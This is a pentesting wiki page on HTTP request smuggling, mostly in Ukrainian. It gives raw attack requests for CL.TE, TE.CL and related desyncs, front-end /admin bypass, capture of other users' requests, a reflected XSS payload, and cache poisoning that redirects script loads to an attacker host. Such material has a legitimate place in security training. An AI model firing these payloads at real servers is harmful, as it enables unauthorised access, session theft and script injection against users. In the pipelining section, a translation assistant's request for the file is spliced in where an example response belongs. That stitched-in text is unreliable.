# HTTP Request Smuggling / HTTP Desync Attack

{{#include ../../banners/hacktricks-training.md}}


## Що це таке

Ця вразливість виникає, коли відбувається **десинхронізація** між **front-end proxy** та **back-end** сервером, що дозволяє **атаці** відправити HTTP **запит**, який **буде інтерпретований** як **один запит** front-end proxy (load balancer/reverse-proxy) і **як 2 запити** back-end сервером.\
Це дозволяє користувачу **змінити наступний запит**, який надходить до back-end сервера після його запиту.

### Теорія

[**RFC Specification (2161)**](https://tools.ietf.org/html/rfc2616)

> If a message is received with both a Transfer-Encoding header field and a Content-Length header field, the latter MUST be ignored.

**Content-Length**

> The Content-Length entity header indicates the size of the entity-body, in bytes, sent to the recipient.

**Transfer-Encoding: chunked**

> The Transfer-Encoding header specifies the form of encoding used to safely transfer the payload body to the user.\
> Chunked means that large data is sent in a series of chunks

### Реальність

Фронт-енд (a load-balance / Reverse Proxy) **обробляє** або _**Content-Length**_, або _**Transfer-Encoding**_ заголовок, а бекенд-сервер **обробляє інший**, спричиняючи **десинхронізацію** між двома системами.\
Це може бути дуже критично, оскільки **атакуючий зможе відправити один запит** до reverse proxy, який **бекенд** буде **інтерпретувати** як **2 різні запити**. Небезпека цієї техніки полягає в тому, що **бекенд** буде інтерпретувати **вставлений другий запит** так, ніби він **надійшов від наступного клієнта**, а реальний запит цього клієнта стане **частиною** вставленого запиту.

### Особливості

Пам'ятайте, що в HTTP **символ нового рядка складається з 2 байт:**

- **Content-Length**: цей заголовок використовує **десяткове число**, щоб вказати **кількість байтів** в **тілі** запиту. Тіло очікується завершеним у останньому символі, **новий рядок в кінці запиту не потрібен**.
- **Transfer-Encoding:** цей заголовок використовує в **тілі** **шістнадцяткове число**, щоб вказати **кількість байтів** наступного **chunk'у**. **Chunk** має **закінчуватися** новим рядком, але цей новий рядок **не враховується** індикатором довжини. Цей метод передачі має завершуватися **chunk'ом розміру 0, за яким слідують 2 new line**: `0`
- **Connection**: на підставі мого досвіду рекомендовано використовувати **`Connection: keep-alive`** у першому запиті при спробі request smuggling.

### Видиме - Приховане

Головна проблема з HTTP/1.1 у тому, що всі запити йдуть через один TCP сокет, тож якщо між двома системами, що отримують запити, є невідповідність, можна відправити один запит, який буде трактований як два різні запити (або більше) кінцевим бекендом (або навіть проміжними системами).

**[This blog post](https://portswigger.net/research/http1-must-die)** пропонує нові способи виявлення desync-атак на систему, які не будуть помічені WAFs. Для цього вона представляє поведінки Visible vs Hidden. Мета в цьому випадку — спробувати знайти розбіжності в відповіді, використовуючи техніки, які можуть спричиняти десинхронизації, не експлуатуючи нічого фактично.

Наприклад, відправка запиту з нормальним Host заголовком і одночасно `" host"` заголовком: якщо бекенд скаржиться на цей запит (можливо, тому що значення `" host"` некоректне), це може означати, що фронт-енд не врахував `" host"` заголовок, тоді як кінцевий бекенд його використав — ймовірно вказуючи на десинхронізацію між фронт-ендом і бекендом.

Це було б **Приховане-Видиме розходження**.

Якщо фронт-енд врахував би `" host"` заголовок, а бекенд ні, це могло б бути **Видиме-Приховане**.

Наприклад, це дозволило виявити десинхронізації між AWS ALB як фронтом і IIS як бекендом. Коли був надісланий "Host: foo/bar", ALB повертав `400, Server; awselb/2.0`, але коли був надісланий "Host : foo/bar", він повертав `400, Server: Microsoft-HTTPAPI/2.0`, що вказувало на те, що відповідь надходить від бекенду. Це приклад Hidden-Visible (H-V).

Зверніть увагу, що ця ситуація не була виправлена в AWS, але її можна запобігти, встановивши `routing.http.drop_invalid_header_fields.enabled` і `routing.http.desync_mitigation_mode = strictest`.


## Базові приклади

> [!TIP]
> When trying to exploit this with Burp Suite **disable `Update Content-Length` and `Normalize HTTP/1 line endings`** in the repeater because some gadgets abuse newlines, carriage returns and malformed content-lengths.

HTTP request smuggling атаки формуються шляхом відправлення неоднозначних запитів, що експлуатують розбіжності в інтерпретації `Content-Length` (CL) і `Transfer-Encoding` (TE) між front-end і back-end серверами. Ці атаки можуть проявлятися в різних формах, переважно як **CL.TE**, **TE.CL**, і **TE.TE**. Кожен тип відображає унікальне поєднання того, як фронт-енд і бекенд віддають пріоритет цим заголовкам. Вразливості виникають, коли сервери обробляють один і той же запит по-різному, що призводить до непередбачуваних і потенційно шкідливих наслідків.

### Базові приклади типів вразливостей

![https://twitter.com/SpiderSec/status/1200413390339887104?ref_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104&ref_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../images/EKi5edAUUAAIPIK.jpg)

> [!TIP]
> До попередньої таблиці слід додати техніку TE.0, аналогічну CL.0, але з використанням Transfer-Encoding.

#### CL.TE Vulnerability (Content-Length used by Front-End, Transfer-Encoding used by Back-End)

- **Front-End (CL):** Обробляє запит на основі заголовка `Content-Length`.
- **Back-End (TE):** Обробляє запит на основі заголовка `Transfer-Encoding`.
- **Сценарій атаки:**

- Атакуючий відправляє запит, де значення заголовка `Content-Length` не відповідає фактичній довжині вмісту.
- Front-end сервер пересилає увесь запит на бекенд, спираючись на значення `Content-Length`.
- Back-end сервер обробляє запит як chunked через заголовок `Transfer-Encoding: chunked`, інтерпретуючи залишкові дані як окремий, наступний запит.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### TE.CL Vulnerability (Transfer-Encoding used by Front-End, Content-Length used by Back-End)

- **Front-End (TE):** Обробляє запит на основі заголовка `Transfer-Encoding`.
- **Back-End (CL):** Обробляє запит на основі заголовка `Content-Length`.
- **Сценарій атаки:**

- Атакуючий відправляє chunked-запит, де розмір chunk'у (`7b`) і фактична довжина вмісту (`Content-Length: 4`) не збігаються.
- Front-end сервер, дотримуючись `Transfer-Encoding`, пересилає увесь запит на бекенд.
- Back-end сервер, поважаючи `Content-Length`, обробляє лише початкову частину запиту (7b байт), залишаючи решту як частину небажаного наступного запиту.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### TE.TE Vulnerability (Transfer-Encoding used by both, with obfuscation)

- **Servers:** Обидва підтримують `Transfer-Encoding`, але один може бути введений в оману обфускацією.
- **Сценарій атаки:**

- Атакуючий відправляє запит з обфусцированими заголовками `Transfer-Encoding`.
- Залежно від того, який сервер (front-end або back-end) не розпізнає обфускацію, можна експлуатувати CL.TE або TE.CL вразливість.
- Непроцессована частина запиту, як її бачить один із серверів, стає частиною наступного запиту, що призводить до smuggling.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **CL.CL Scenario (Content-Length used by both Front-End and Back-End)**

- Обидва сервери обробляють запит виключно за заголовком `Content-Length`.
- Цей сценарій зазвичай не призводить до smuggling, оскільки є узгодженість у тому, як обидва сервери інтерпретують довжину запиту.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Normal Request
```

#### **CL.0 Scenario**

- Мається на увазі сценарії, де заголовок `Content-Length` присутній і має значення, відмінне від нуля, вказуючи, що тіло запиту не порожнє. Бекенд ігнорує заголовок `Content-Length` (вважає його рівним 0), але фронт-енд його парсить.
- Це важливо для розуміння і створення smuggling-атак, оскільки це впливає на те, як сервери визначають кінець запиту.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Non-Empty Body
```

#### TE.0 Scenario

- Подібно до попереднього, але з використанням TE.
- Technique [reported here](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/)
- **Приклад**:
```
OPTIONS / HTTP/1.1
Host: {HOST}
Accept-Encoding: gzip, deflate, br
Accept: */*
Accept-Language: en-US;q=0.9,en;q=0.8
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36
Transfer-Encoding: chunked
Connection: keep-alive

50
GET <http://our-collaborator-server/> HTTP/1.1
x: X
0
EMPTY_LINE_HERE
EMPTY_LINE_HERE
```
#### `0.CL` Сценарій

У ситуації `0.CL` запит надсилається з Content-Length на кшталт:
```
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
7

GET /404 HTTP/1.1
X: Y
```
І фронтенд не бере до уваги `Content-Length`, тому він відправляє на бекенд лише перший запит (до 7 у прикладі). Натомість бекенд бачить `Content-Length` і чекає на тіло, яке ніколи не надходить, бо фронтенд уже чекає на відповідь.

Проте якщо існує запит, який можна надіслати на бекенд і на який відповідають до отримання тіла запиту, цей deadlock не відбудеться. Наприклад, в IIS це трапляється при відправленні запитів до заборонених слів, наприклад `/con` (check the [documentation](https://learn.microsoft.com/en-us/windows/win32/fileio/naming-a-file)), таким чином початковий запит буде оброблений негайно, а другий запит міститиме запит жертви, наприклад:
```
GET / HTTP/1.1
X: yGET /victim HTTP/1.1
Host: <redacted>
```
Це корисно для викликання desync, але до цього моменту не мало жодного впливу.

Однак у пості пропонується рішення цього шляхом перетворення **[0.CL attack into a CL.0 with a double desync](https://portswigger.net/research/http1-must-die)**.

#### Порушення роботи веб-сервера

Ця техніка також корисна в ситуаціях, коли можливо **break a web server while reading the initial HTTP data** але **without closing the connection**. Таким чином, **body** HTTP-запиту буде вважатися **next HTTP request**.

Наприклад, як пояснено в [**this writeup**](https://mizu.re/post/twisty-python), у Werkzeug можна було надіслати деякі **Unicode** символи, що змушувало сервер **break**. Однак, якщо HTTP-з'єднання було встановлене з заголовком **`Connection: keep-alive`**, тіло запиту не буде прочитано і з'єднання залишиться відкритим, тож **body** запиту буде трактуватися як **next HTTP request**.

#### Примус через hop-by-hop headers

Зловживаючи hop-by-hop headers, ви можете вказати proxy **delete the header Content-Length or Transfer-Encoding so a HTTP request smuggling is possible to abuse**.
```
Connection: Content-Length
```
For **more information about hop-by-hop headers** visit:


{{#ref}}
../abusing-hop-by-hop-headers.md
{{#endref}}

## Виявлення HTTP Request Smuggling

Виявлення вразливостей HTTP request smuggling часто досягається за допомогою таймінгових технік, які ґрунтуються на спостереженні за тим, скільки часу сервер відповідає на маніпульовані запити. Ці техніки особливо корисні для виявлення CL.TE та TE.CL вразливостей. Окрім цих методів, існують інші стратегії та інструменти для пошуку таких вразливостей:

### Виявлення CL.TE вразливостей за допомогою таймінгових технік

- **Метод:**

- Надішліть запит, який, якщо застосунок вразливий, змусить бекенд-сервер чекати додаткових даних.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```

- **Спостереження:**
- Фронтенд-сервер обробляє запит на основі `Content-Length` і передчасно перериває повідомлення.
- Бекенд-сервер, очікуючи chunked-повідомлення, чекає наступного chunk, який ніколи не надходить, що спричиняє затримку.

- **Індикатори:**
- Таймаути або тривалі затримки відповіді.
- Отримання 400 Bad Request від бекенд-сервера, іноді з детальною інформацією про сервер.

### Виявлення TE.CL вразливостей за допомогою таймінгових технік

- **Метод:**

- Надішліть запит, який, якщо застосунок вразливий, змусить бекенд-сервер чекати додаткових даних.
- **Приклад:**

```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```

- **Спостереження:**
- Фронтенд-сервер обробляє запит на основі `Transfer-Encoding` і пересилає повне повідомлення.
- Бекенд-сервер, очікуючи повідомлення на основі `Content-Length`, чекає додаткових даних, які ніколи не надходять, що викликає затримку.

### Інші методи пошуку вразливостей

- **Диференційний аналіз відповідей:**
- Надсилайте трохи відмінні версії запиту і спостерігайте, чи відповіді сервера відрізняються несподіваним чином, що вказує на розбіжність у парсингу.
- **Використання автоматизованих інструментів:**
- Інструменти на кшталт розширення 'HTTP Request Smuggler' для Burp Suite можуть автоматично тестувати на такі вразливості, відправляючи різні форми неоднозначних запитів і аналізуючи відповіді.
- **Тести на варіації Content-Length:**
- Надсилайте запити з різними значеннями `Content-Length`, що не збігаються з фактичною довжиною контенту, і спостерігайте, як сервер обробляє такі невідповідності.
- **Тести на варіації Transfer-Encoding:**
- Надсилайте запити з обфускованими або пошкодженими заголовками `Transfer-Encoding` і відстежуйте, як по-різному фронтенд і бекенд сервери реагують на такі маніпуляції.

### The `Expect: 100-continue` header

Перевірте, як цей заголовок може допомогти при експлуатації http desync у:

{{#ref}}
../special-http-headers.md
{{#endref}}

### HTTP Request Smuggling Vulnerability Testing

Після підтвердження ефективності таймінгових технік важливо перевірити, чи можна маніпулювати клієнтськими запитами. Простий метод — спробувати poisoning ваших запитів, наприклад, змусити запит до `/` повернути 404. Приклади `CL.TE` та `TE.CL`, розглянуті раніше в [Basic Examples](#basic-examples), демонструють, як poison-ити клієнтський запит, щоб отримати 404 відповідь, всупереч тому, що клієнт намагався звернутися до іншого ресурсу.

**Ключові моменти**

Під час тестування на вразливості request smuggling через втручання в інші запити врахуйте:

- **Роздільні мережеві з'єднання:** "атака" та "нормальні" запити повинні відправлятися по окремих мережевих з'єднаннях. Використання одного й того ж з'єднання для обох не підтверджує наявність вразливості.
- **Послідовні URL і параметри:** Намагайтеся використовувати однакові URL та імена параметрів для обох запитів. Сучасні застосунки часто маршрутизують запити на конкретні бекенд-сервери на основі URL та параметрів. Узгодження цих значень підвищує ймовірність того, що обидва запити оброблятиме той самий сервер, що є передумовою для успішної атаки.
- **Таймінг і умов гонки:** "Нормальний" запит, призначений для виявлення перешкод від "атаки", конкурує з іншими одночасними запитами застосунку. Тому відправляйте "нормальний" запит відразу після "атакуючого" запиту. Завантажені застосунки можуть вимагати кількох спроб для остаточного підтвердження вразливості.
- **Проблеми балансування навантаження:** Фронтенд-сервери, що діють як load balancers, можуть розподіляти запити між різними бекенд-системами. Якщо "атака" і "нормальний" запити потрапляють на різні системи, атака не вдасться. Цей аспект балансування може вимагати кількох спроб, щоб підтвердити вразливість.
- **Ненавмисний вплив на користувачів:** Якщо ваша атака ненавмисно впливає на запит іншого користувача (не той "нормальний" запит, який ви відправили для виявлення), це означає, що ваша атака зачепила іншого користувача застосунку. Постійне тестування може порушувати роботу інших користувачів, тому слід діяти обережно.

## Відокремлення артефактів HTTP/1.1 pipelining від справжнього request smuggling

Повторне використання з'єднання (keep-alive) та pipelining можуть легко створювати ілюзії «smuggling» у тестових інструментах, що відправляють кілька запитів по одному сокету. Навчіться відрізняти нешкідливі клієнтські артефакти від реального серверного desync.

### Чому pipelining створює класичні false positives

HTTP/1.1 повторно використовує одне TCP/TLS з'єднання і конкатенує запити та відповіді в одному потоці. При pipelining клієнт відправляє декілька запитів підряд і очікує відповіді в тому ж порядку. Поширений false-positive — повторно відправити пошкоджений CL.0-style payload двічі по одному з'єднанню:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Будь ласка, вставте вміст файлу src/pentesting-web/http-request-smuggling/README.md, який потрібно перекласти. Я перекладу весь релевантний англомовний текст на українську, зберігаючи точно ту саму розмітку Markdown/HTML, не перекладаючи код, імена технік, загальні хакерські терміни, назви хмар/платформ, слово "leak", посилання, шляхи та спеціальні теги/рефери згідно з вашими вказівками.
```
HTTP/1.1 200 OK
Content-Type: text/html

```

```
HTTP/1.1 200 OK
Content-Type: text/plain

User-agent: *
Disallow: /settings
```
Якщо сервер ігнорував некоректний `Content_Length`, то немає FE↔BE десинхронізації. При повторному використанні ваш клієнт фактично відправив цей byte-stream, який сервер розібрав як два незалежні запити:
```
POST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: YPOST / HTTP/1.1
Host: hackxor.net
Content_Length: 47

GET /robots.txt HTTP/1.1
X: Y
```
Impact: none. You just desynced your client from the server framing.

> [!TIP]
> Burp modules that depend on reuse/pipelining: Turbo Intruder with `requestsPerConnection>1`, Intruder with "HTTP/1 connection reuse", Repeater "Send group in sequence (single connection)" or "Enable connection reuse".

### Litmus tests: pipelining or real desync?

1. Disable reuse and re-test
- In Burp Intruder/Repeater, turn off HTTP/1 reuse and avoid "Send group in sequence".
- In Turbo Intruder, set `requestsPerConnection=1` and `pipeline=False`.
- If the behavior disappears, it was likely client-side pipelining, unless you’re dealing with connection-locked/stateful targets or client-side desync.
2. HTTP/2 nested-response check
- Send an HTTP/2 request. If the response body contains a complete nested HTTP/1 response, you’ve proven a backend parsing/desync bug instead of a pure client artifact.
3. Partial-requests probe for connection-locked front-ends
- Some FEs only reuse the upstream BE connection if the client reused theirs. Use partial-requests to detect FE behavior that mirrors client reuse.
- See PortSwigger "Browser‑Powered Desync Attacks" for the connection-locked technique.
4. State probes
- Look for first- vs subsequent-request differences on the same TCP connection (first-request routing/validation).
- Burp "HTTP Request Smuggler" includes a connection‑state probe that automates this.
5. Visualize the wire
- Use the Burp "HTTP Hacker" extension to inspect concatenation and message framing directly while experimenting with reuse and partial requests.

### Connection‑locked request smuggling (reuse-required)

Some front-ends only reuse the upstream connection when the client reuses theirs. Real smuggling exists but is conditional on client-side reuse. To distinguish and prove impact:
- Prove the server-side bug
- Use the HTTP/2 nested-response check, or
- Use partial-requests to show the FE only reuses upstream when the client does.
- Show real impact even if direct cross-user socket abuse is blocked:
- Cache poisoning: poison shared caches via the desync so responses affect other users.
- Internal header disclosure: reflect FE-injected headers (e.g., auth/trust headers) and pivot to auth bypass.
- Bypass FE controls: smuggle restricted paths/methods past the front-end.
- Host-header abuse: combine with host routing quirks to pivot to internal vhosts.
- Operator workflow
- Reproduce with controlled reuse (Turbo Intruder `requestsPerConnection=2`, or Burp Repeater tab group → "Send group in sequence (single connection)").
- Then chain to cache/header-leak/control-bypass primitives and demonstrate cross-user or authorization impact.

> See also connection‑state attacks, which are closely related but not technically smuggling:
>
>{{#ref}}
>../http-connection-request-smuggling.md
>{{#endref}}

### Client‑side desync constraints

If you’re targeting browser-powered/client-side desync, the malicious request must be sendable by a browser cross-origin. Header obfuscation tricks won’t work. Focus on primitives reachable via navigation/fetch, and then pivot to cache poisoning, header disclosure, or front-end control bypass where downstream components reflect or cache responses.

For background and end-to-end workflows:

{{#ref}}
browser-http-request-smuggling.md
{{#endref}}

### Tooling to help decide

- HTTP Hacker (Burp BApp Store): exposes low-level HTTP behavior and socket concatenation.
- "Smuggling or pipelining?" Burp Repeater Custom Action: https://github.com/PortSwigger/bambdas/blob/main/CustomAction/SmugglingOrPipelining.bambda
- Turbo Intruder: precise control over connection reuse via `requestsPerConnection`.
- Burp HTTP Request Smuggler: includes a connection‑state probe to spot first‑request routing/validation.

> [!NOTE]
> Treat reuse-only effects as non-issues unless you can prove server-side desync and attach concrete impact (poisoned cache artifact, leaked internal header enabling privilege bypass, bypassed FE control, etc.).

## Abusing HTTP Request Smuggling

### Circumventing Front-End Security via HTTP Request Smuggling

Sometimes, front-end proxies enforce security measures, scrutinizing incoming requests. However, these measures can be circumvented by exploiting HTTP Request Smuggling, allowing unauthorized access to restricted endpoints. For instance, accessing `/admin` might be prohibited externally, with the front-end proxy actively blocking such attempts. Nonetheless, this proxy may neglect to inspect embedded requests within a smuggled HTTP request, leaving a loophole for bypassing these restrictions.

Consider the following examples illustrating how HTTP Request Smuggling can be used to bypass front-end security controls, specifically targeting the `/admin` path which is typically guarded by the front-end proxy:

**CL.TE Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
У атаці CL.TE заголовок `Content-Length` використовується для початкового запиту, тоді як наступний вбудований запит використовує заголовок `Transfer-Encoding: chunked`. Front-end proxy обробляє початковий `POST` запит, але не перевіряє вбудований `GET /admin` запит, що дозволяє несанкціонований доступ до шляху `/admin`.

**TE.CL Example**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Навпаки, в атаці TE.CL початковий запит `POST` використовує `Transfer-Encoding: chunked`, а наступний вбудований запит обробляється на підставі заголовка `Content-Length`. Подібно до атаки CL.TE, front-end proxy overlooks the smuggled `GET /admin` request, inadvertently granting access to the restricted `/admin` path.

### Revealing front-end request rewriting <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Додатки часто використовують фронтальний сервер для модифікації вхідних запитів перед передачею їх на back-end сервер. Типова модифікація полягає у додаванні заголовків, наприклад `X-Forwarded-For: <IP of the client>`, щоб переадресувати IP клієнта на back-end. Розуміння цих змін може бути критично важливим, оскільки це може виявити способи **обходу захисту** або **виявлення прихованої інформації чи кінцевих точок**.

Щоб дослідити, як proxy змінює запит, знайдіть параметр POST, який back-end відображає у відповіді. Потім сформуйте запит, використавши цей параметр останнім, наприклад:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
У цій структурі наступні компоненти запиту додаються після `search=`, який є параметром, відображеним у відповіді. Це відображення покаже заголовки наступного запиту.

Важливо, щоб заголовок `Content-Length` вкладеного запиту відповідав фактичній довжині вмісту. Рекомендується починати з невеликого значення і поступово збільшувати його, оскільки занадто мале значення обрізатиме відображені дані, а занадто велике може спричинити помилку запиту.

Ця техніка також застосовна в контексті вразливості TE.CL, але запит має завершуватися `search=\r\n0`. Незалежно від символів нового рядка, значення будуть додаватися до параметра search.

Цей метод служить насамперед для розуміння модифікацій запиту, які вносить front-end proxy, по суті виконуючи самостійну перевірку.

### Захоплення запитів інших користувачів <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Можна захопити запити наступного користувача, додавши певний запит як значення параметра під час POST-операції. Ось як це можна зробити:

Додавши наступний запит як значення параметра, ви можете зберегти запит наступного клієнта:
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
У цьому сценарії **comment parameter** призначений для збереження вмісту секції коментарів допису на загальнодоступній сторінці. Отже, вміст наступного запиту з'явиться як коментар.

Однак ця техніка має обмеження. Зазвичай вона захоплює дані лише до роздільника параметра, який використовується в smuggled request. Для URL-encoded form submissions цей роздільник — символ `&`. Це означає, що захоплений вміст із запиту жертви припиниться на першому `&`, який може бути навіть частиною query string.

Крім того, варто зазначити, що цей підхід також працює при наявності вразливості TE.CL. У таких випадках запит має завершуватися `search=\r\n0`. Незалежно від символів нового рядка, значення будуть додані до параметра search.

### Використання HTTP request smuggling для експлуатації Reflected XSS

HTTP Request Smuggling можна використовувати для атак на веб-сторінки, вразливі до **Reflected XSS**, що дає суттєві переваги:

- Взаємодія з цільовими користувачами **не потрібна**.
- Дозволяє експлуатувати XSS у частинах запиту, які **зазвичай недоступні**, наприклад HTTP request headers.

У випадках, коли вебсайт вразливий до Reflected XSS через заголовок User-Agent, наступний payload демонструє, як експлуатувати цю вразливість:
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Цей payload структуровано для експлуатації вразливості шляхом:

1. Ініціювання `POST` запиту, здавалося б типовий, з заголовком `Transfer-Encoding: chunked`, що вказує на початок smuggling.
2. Далі слідує `0`, що позначає кінець chunked message body.
3. Потім вводиться smuggled `GET` запит, в якому заголовок `User-Agent` інжектовано скриптом `<script>alert(1)</script>`, що викликає XSS, коли сервер обробляє цей наступний запит.

Маніпулюючи `User-Agent` через smuggling, payload обходить звичні обмеження запитів, тим самим експлуатуючи Reflected XSS в нестандартний, але ефективний спосіб.

#### HTTP/0.9

> [!CAUTION]
> У разі, якщо вміст користувача відображається у відповіді з **`Content-type`** наприклад **`text/plain`**, що перешкоджає виконанню XSS. Якщо сервер підтримує **HTTP/0.9**, це може дозволити обійти це!

Версія HTTP/0.9 передувала 1.0 і використовує лише **GET**-запити та **не** повертає **заголовки**, лише тіло.

В [**this writeup**](https://mizu.re/post/twisty-python) це було зловживано через request smuggling та **вразливу endpoint, яка відповідає введеними користувачем даними**, щоб smuggle запит з HTTP/0.9. Параметр, який буде відображено у відповіді, містив **підробну HTTP/1.1 response (with headers and body)**, тому відповідь міститиме виконуваний JS-код з `Content-Type` `text/html`.

### Експлуатація On-site Redirects за допомогою HTTP Request Smuggling <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Застосунки часто перенаправляють з одного URL на інший, використовуючи hostname з заголовка `Host` у redirect URL. Це поширено для веб-серверів, таких як Apache та IIS. Наприклад, запит папки без кінцевого слеша призводить до редиректу з додаванням слеша:
```
GET /home HTTP/1.1
Host: normal-website.com
```
Результати:
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Хоча на перший погляд нешкідлива, ця поведінка може бути використана за допомогою HTTP request smuggling для перенаправлення користувачів на зовнішній сайт. Наприклад:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Цей smuggled request може спричинити, що наступний оброблений запит користувача буде перенаправлений на attacker-controlled website:
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
Призводить до:
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
У цьому сценарії запит користувача на файл JavaScript перехоплюється. Атакуючий може скомпрометувати користувача, відповівши шкідливим JavaScript.

### Експлуатація Web Cache Poisoning через HTTP Request Smuggling <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

Web cache poisoning може виконуватися, якщо якийсь компонент **front-end infrastructure caches content**, зазвичай для підвищення продуктивності. Маніпулюючи відповіддю сервера, можна **poison the cache**.

Раніше ми показали, як відповіді сервера можна змінити, щоб повернути помилку 404 (див. [Basic Examples](#basic-examples)). Аналогічно, можна обдурити сервер, щоб він віддав вміст `/index.html` у відповідь на запит до `/static/include.js`. Внаслідок цього вміст `/static/include.js` замінюється в кеші на вміст `/index.html`, через що `/static/include.js` стає недоступним для користувачів, що може призвести до Denial of Service (DoS).

Ця техніка стає особливо потужною, якщо виявлено **Open Redirect vulnerability** або якщо існує **on-site redirect to an open redirect**. Такі вразливості можна використати, щоб замінити кешований вміст `/static/include.js` на скрипт під контролем атакуючого, фактично реалізувавши масштабну Cross-Site Scripting (XSS) атаку проти всіх клієнтів, які запитують оновлений `/static/include.js`.

Нижче наведено ілюстрацію використання **cache poisoning combined with an on-site redirect to open redirect**. Метою є змінити кешований вміст `/static/include.js`, щоб він повертав JavaScript-код під контролем атакуючого:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Зверніть увагу на вкладений запит, спрямований на `/post/next?postId=3`. Цей запит буде перенаправлено на `/post?postId=4`, використовуючи значення **Host header value** для визначення домену. Змінюючи **Host header**, атакуючий може перенаправити запит на свій домен (**on-site redirect to open redirect**).

Після успішного **socket poisoning**, слід ініціювати **GET request** до `/static/include.js`. Цей запит буде заражений попереднім **on-site redirect to open redirect** запитом і отримає вміст скрипта, контрольованого атакуючим.

В подальшому будь-який запит до `/static/include.js` повертатиме кешований вміст скрипта атакуючого, фактично запускаючи масивну XSS-атаку.

### Using HTTP request smuggling to perform web cache deception <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Яка різниця між web cache poisoning та web cache deception?**
>
> - У випадку **web cache poisoning** атакуючий змушує застосунок зберегти деякий шкідливий контент у кеші, і цей контент служиться з кешу іншим користувачам застосунку.
> - У випадку **web cache deception** атакуючий змушує застосунок зберегти в кеші деякий конфіденційний контент, що належить іншому користувачеві, а потім витягує цей контент з кешу.

